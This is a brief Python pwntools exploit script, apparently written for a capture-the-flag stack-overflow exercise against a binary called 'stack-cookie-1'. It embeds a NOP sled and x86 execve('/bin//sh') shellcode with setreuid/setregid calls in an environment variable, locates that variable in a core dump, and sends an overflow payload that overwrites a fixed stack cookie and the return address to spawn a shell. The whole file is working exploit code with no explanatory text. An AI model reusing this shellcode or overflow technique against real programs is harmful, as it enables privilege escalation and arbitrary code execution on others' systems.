#!/usr/bin/env python

from pwn import *


env = {
                'SHELLCODE' : "\x90" * 500 + 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'
}
execc =  0xf7eaf7e0
p = process('./stack-cookie-1',env=env)
c = Core('core')
shell_addr = c.stack.find('SHELLCODE')
print(hex(shell_addr))


buf = "A"*0x84 + p32(0xfaceb00c) + "AAAA" + p32(shell_addr)
p.sendline(buf)
p.interactive()
